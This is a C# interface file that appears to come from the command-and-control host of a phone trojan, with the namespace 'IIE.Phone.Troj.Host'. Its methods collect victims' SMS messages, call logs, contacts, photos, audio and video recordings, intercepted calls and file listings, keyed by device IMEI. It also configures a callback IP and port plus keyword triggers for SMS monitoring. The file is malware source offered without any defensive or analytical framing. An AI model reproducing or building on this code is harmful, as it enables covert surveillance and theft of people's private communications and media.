using InOut.Entity;
using InOut.PacketImp;
using IIE.Phone.Troj.Host.Model;

namespace IIE.Phone.Troj.Host
{
    public interface IMainView
    {
        ILog Log { get; }
        IServer Server { get; set; }
        void DeleteUser(string imei);
        void AddUser(UserInfo user);
        void SaveSoundChannel(string imei, int channel);

        void SavePictureChannel(string imei, int channel);
        void SaveCallLogChannel(string imei, int channel);

        void SaveSMSChannel(string imei, int channel);
        void SaveContactChannel(string imei, int channel);

        void SaveMonitorCallChannel(string imei, int channel);

        void SaveMonitorSMSChannel(string imei, int channel);

        void SaveVideoChannel(string imei, int channel);

        void UpdateAdvInformations(string imei, AdvancedInformationPacket packet);
        void UpdateUserCallLogs(string imei, CallPacket[] list);
        void AddMonitoredCall(string imei, int type, string phonenumber, string date, byte[] phonedata);
        void UpdateContacts(string imei, Contact[] list);
        void UpdateFileTree(string imei, MyFile[] list);
        void UpdateUserPicture(string imei, byte[] getData);
        void UpdatePreference(string imei, string ip, int port, bool waitTrigger, string[] phoneNumberCall, string[] phoneNumberSMS, string[] keywordSMS);
        void UpdateSMS(string imei, SMSPacket[] list);
        void AddMonitoredSMS(string imei, string address, long date, string body);
        void AddSoungBytes(string imei, byte[] data);
        void AddVideoBytes(string imei, byte[] data);
    }
}
